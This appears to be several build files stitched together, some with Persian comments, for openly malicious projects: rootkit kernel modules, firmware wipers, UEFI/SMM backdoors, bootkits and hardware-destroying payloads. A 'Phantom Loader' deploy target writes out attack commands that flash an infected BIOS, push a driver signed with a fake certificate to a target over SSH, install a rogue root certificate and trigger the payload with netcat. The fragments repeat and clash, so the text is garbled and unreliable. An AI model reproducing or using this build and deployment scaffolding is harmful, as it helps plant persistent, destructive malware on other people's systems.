 .PHONY: all clean

all:
 @echo "Building project..."
 @./scripts/build_system.sh

clean:
 @echo "Cleaning project..."
 @rm -rf build bin
 @make -C src/kernel clean
 @make -C src/user clean
 @make -C src/bootkit clean

deploy:
 @sudo ./scripts/deploy.sh

test:
 @./test/integration/full_test.sh

obj-m += stealth.o backdoor.o hooking.o persistence.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	strip -g *.ko

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm -f *.mod.c *.mod.o *.o modules.order Module.symvers

	obj-m += stealth.o backdoor.o hooking.o persistence.o
obj-m += syscall_restore.o

all:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 strip -g *.ko

clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 rm -f *.mod.c *.mod.o *.o modules.order Module.symvers
 rm -f scripts/load scripts/unload

install:
 cp *.ko /lib/modules/$(shell uname -r)/kernel/drivers/
 depmod -a

uninstall:
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/stealth.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/backdoor.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/hooking.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/persistence.ko
 depmod -a

 obj-m += deepscorch.o

deepscorch-y := \
    scorch_entry.o \
    mem_corrupt.o \
    crypto_annihilate.o \
    firmware_erase.o \
    utils.o

all:
    nasm -f elf64 core/scorch_entry.asm -o scorch_entry.o
    nasm -f elf64 core/mem_corrupt.asm -o mem_corrupt.o
    nasm -f elf64 core/crypto_annihilate.asm -o crypto_annihilate.o
    nasm -f elf64 core/firmware_erase.asm -o firmware_erase.o
    nasm -f elf64 core/utils.asm -o utils.o
    ld -r -o deepscorch.o scorch_entry.o mem_corrupt.o crypto_annihilate.o firmware_erase.o utils.o

clean:
    rm -f *.o
    rm -f deepscorch.ko

obj-m += deepscorch.o

all:
    nasm -f elf64 core/scorch.asm -o scorch.o
    ld -r -o deepscorch.o scorch.o

clean:
    rm -f *.o
    rm -f deepscorch.ko

# سیستم ساخت Omni-Destroyer

ASM = nasm
ASMFLAGS = -f elf64 -O3 -F dwarf -g
LD = ld
LDFLAGS = -T link.ld -m elf_x86_64 --oformat=binary -z noexecstack
OBJCOPY = objcopy
STRIP = strip

TARGET = omnidestroyer.bin
KERNEL_MODULE = omnidestroyer.ko
SPI_IMAGE = bios_override.bin

SRC_DIR = .
CORE_DIR = $(SRC_DIR)/core
DRIVERS_DIR = $(SRC_DIR)/drivers
PROTOCOLS_DIR = $(SRC_DIR)/protocols

SRCS = $(CORE_DIR)/bootstrap.asm \
       $(CORE_DIR)/payload.asm \
       $(CORE_DIR)/encryption.asm \
       $(CORE_DIR)/persistence.asm \
       $(CORE_DIR)/network.asm \
       $(CORE_DIR)/evasion.asm \
       $(CORE_DIR)/destruct.asm \
       $(DRIVERS_DIR)/spi_flash.asm \
       $(DRIVERS_DIR)/gpu_override.asm \
       $(DRIVERS_DIR)/nvme_controller.asm \
       $(PROTOCOLS_DIR)/covert_icmp.asm \
       $(PROTOCOLS_DIR)/dns_tunnel.asm \
       $(PROTOCOLS_DIR)/radio_signal.asm

OBJS = $(SRCS:.asm=.o)

.PHONY: all clean deploy

all: $(TARGET) $(KERNEL_MODULE) $(SPI_IMAGE)

$(TARGET): $(OBJS)
	$(LD) $(LDFLAGS) -o $@ $^
	$(OBJCOPY) -O binary --only-section=.text $@
	$(STRIP) -s $@

%.o: %.asm
	$(ASM) $(ASMFLAGS) -o $@ $<

$(KERNEL_MODULE): $(TARGET)
	./scripts/build_module.sh $< $@

$(SPI_IMAGE): $(TARGET)
	./scripts/build_spi_image.sh $< $@

deploy: all
	./scripts/deploy.sh

clean:
	rm -f $(OBJS) $(TARGET) $(KERNEL_MODULE) $(SPI_IMAGE)
	find . -name "*.o" -delete
	find . -name "*.bin" -delete

# سیستم ساخت OMNI-ZERO

ASM = nasm
ASMFLAGS = -f elf64 -O3 -F dwarf -g
LD = ld
LDFLAGS = -T linker.ld --oformat=binary -z noexecstack
OBJCOPY = objcopy
STRIP = strip
PYTHON = python3

TARGET = omni-zero.bin
KERNEL_MODULE = omni-zero.ko
FIRMWARE_IMAGE = bios-override.bin

SRC_DIR = .
CORE_DIR = $(SRC_DIR)/core
FIRMWARE_DIR = $(SRC_DIR)/firmware
DRIVERS_DIR = $(SRC_DIR)/drivers
PROTOCOLS_DIR = $(SRC_DIR)/protocols
PAYLOADS_DIR = $(SRC_DIR)/payloads
SCRIPTS_DIR = $(SRC_DIR)/scripts

SRCS = $(CORE_DIR)/exploit.asm \
       $(CORE_DIR)/payload.asm \
       $(CORE_DIR)/persistence.asm \
       $(CORE_DIR)/evasion.asm \
       $(CORE_DIR)/communication.asm \
       $(FIRMWARE_DIR)/uefi_exploit.asm \
       $(FIRMWARE_DIR)/acpi_hook.asm \
       $(FIRMWARE_DIR)/smm_backdoor.asm \
       $(DRIVERS_DIR)/network_driver.asm \
       $(DRIVERS_DIR)/pci_override.asm \
       $(PROTOCOLS_DIR)/ipv6_covert.asm \
       $(PROTOCOLS_DIR)/dma_attack.asm \
       $(PROTOCOLS_DIR)/radio_protocol.asm

OBJS = $(SRCS:.asm=.o)
PAYLOADS = $(PAYLOADS_DIR)/kernel_wiper.bin \
           $(PAYLOADS_DIR)/bios_overwrite.bin \
           $(PAYLOADS_DIR)/hw_destructor.bin

.PHONY: all clean deploy firmware

all: $(TARGET) $(KERNEL_MODULE) $(FIRMWARE_IMAGE)

$(TARGET): $(OBJS) $(PAYLOADS)
    $(LD) $(LDFLAGS) -o $@ $^
    $(OBJCOPY) -O binary --only-section=.text $@
    $(STRIP) -s $@

%.o: %.asm
    $(ASM) $(ASMFLAGS) -o $@ $<

$(KERNEL_MODULE): $(TARGET)
    ./scripts/build_module.sh $< $@

$(FIRMWARE_IMAGE): $(TARGET)
    ./scripts/build_firmware.sh $< $@

firmware: $(FIRMWARE_IMAGE)

deploy: all firmware
    ./scripts/deploy.sh

clean:
    rm -f $(OBJS) $(TARGET) $(KERNEL_MODULE) $(FIRMWARE_IMAGE) $(PAYLOADS)
    find . -name "*.o" -delete
    find . -name "*.bin" -delete

pack:
    tar -czvf omni-zero.tar.gz $(SRCS) $(PAYLOADS) Makefile scripts/*

encrypt:
    $(PYTHON) scripts/encryptor.py --key $(ENCRYPTION_KEY) --input omni-zero.tar.gz --output omni-zero.enc

    
# سیستم ساخت OmniLowLevelAccess

ASM = nasm
LD = ld
ASMFLAGS = -f elf64 -O3 -F dwarf -g
LDFLAGS = -T linker.ld -nostdlib -static -z max-page-size=0x1000
OBJCOPY = objcopy
STRIP = strip

TARGET = omni_low_level.bin

SRC_DIR = .
CORE_DIR = $(SRC_DIR)/core
DRIVERS_DIR = $(SRC_DIR)/drivers
INTERFACES_DIR = $(SRC_DIR)/interfaces
LIB_DIR = $(SRC_DIR)/lib

SRCS = $(CORE_DIR)/memory_manager.asm \
       $(CORE_DIR)/cpu_control.asm \
       $(CORE_DIR)/hardware_access.asm \
       $(CORE_DIR)/interrupt_controller.asm \
       $(CORE_DIR)/dma_manager.asm \
       $(DRIVERS_DIR)/pci_driver.asm \
       $(DRIVERS_DIR)/spi_flash_driver.asm \
       $(DRIVERS_DIR)/nvme_controller.asm \
       $(INTERFACES_DIR)/bios_interface.asm \
       $(INTERFACES_DIR)/acpi_interface.asm \
       $(INTERFACES_DIR)/smm_interface.asm \
       $(LIB_DIR)/util.asm \
       $(LIB_DIR)/encryption.asm \
       main.asm

OBJS = $(SRCS:.asm=.o)

.PHONY: all clean

all: $(TARGET)

$(TARGET): $(OBJS)
    $(LD) $(LDFLAGS) -o $@ $^
    $(OBJCOPY) -O binary $@ $@.bin
    $(STRIP) -s $@

%.o: %.asm
    $(ASM) $(ASMFLAGS) -o $@ $<

clean:
    rm -f $(OBJS) $(TARGET) $(TARGET).bin

# سیستم ساخت Phantom Loader

# تنظیمات
ASM = nasm
LD = ld
CC = gcc
CFLAGS = -O3 -Wall -Wextra -fno-stack-protector -fPIC
ASMFLAGS = -f elf64 -O3 -F dwarf -g
LDFLAGS = -T linker.ld -nostdlib -z max-page-size=0x1000
OBJCOPY = objcopy
STRIP = strip
SIGN_TOOL = python3 tools/sign_tool.py
FIRMWARE_TOOL = python3 tools/firmware_tool.py

# فایل‌ها
CORE_SRCS = core/bootkit.asm core/efi_injector.asm core/driver_exploit.asm core/stealth.asm
PAYLOAD_SRCS = payload/kernel_module.asm payload/persistence.asm
INTERFACE_SRCS = interfaces/uefi.inc interfaces/acpi.inc interfaces/smm.inc
TOOLS = tools/sign_tool.py tools/firmware_tool.py

# اهداف
TARGETS = phantom_bootkit.bin phantom_efi_module.efi phantom_driver.sys

.PHONY: all clean deploy

all: $(TARGETS)

# ساخت بوت‌کیت
phantom_bootkit.bin: core/bootkit.asm
	$(ASM) $(ASMFLAGS) -o $@.o $<
	$(LD) $(LDFLAGS) -o $@.elf $@.o
	$(OBJCOPY) -O binary $@.elf $@
	$(STRIP) -s $@.elf

# ساخت ماژول EFI
phantom_efi_module.efi: core/efi_injector.asm interfaces/uefi.inc
	$(ASM) $(ASMFLAGS) -o $@.o $<
	$(LD) $(LDFLAGS) -o $@.elf $@.o
	$(OBJCOPY) -O binary $@.elf $@

# ساخت درایور مخرب
phantom_driver.sys: core/driver_exploit.asm
	$(ASM) $(ASMFLAGS) -o $@.o $<
	$(LD) $(LDFLAGS) -o $@.elf $@.o
	$(OBJCOPY) -O binary $@.elf $@
	$(SIGN_TOOL) -d $@ -c certs/fake_cert.pem -k certs/fake_key.pem

# ساخت فریم‌ور آلوده
infected_bios.bin: firmware/original_bios.bin payload/kernel_module.asm
	$(FIRMWARE_TOOL) -f firmware/original_bios.bin -p payload/kernel_payload.bin -o $@

# استقرار
deploy: infected_bios.bin phantom_driver.sys
	# فلش فریم‌ور آلوده
	flashrom -p internal -w infected_bios.bin
	
	# نصب درایور مخرب
	scp phantom_driver.sys root@target:/tmp/
	ssh root@target "certutil -addstore root fake_cert.pem"
	ssh root@target "drvload /tmp/phantom_driver.sys"
	
	# فعال‌سازی پیلود
	ssh root@target "echo ACTIVATE | nc localhost 31337"

# پاک‌سازی
clean:
	rm -f *.o *.elf *.bin *.sys *.efi
	rm -f infected_bios.bin

all:
	nasm -f elf64 ../src/main.asm -o omni.o
	ld -o omni omni.o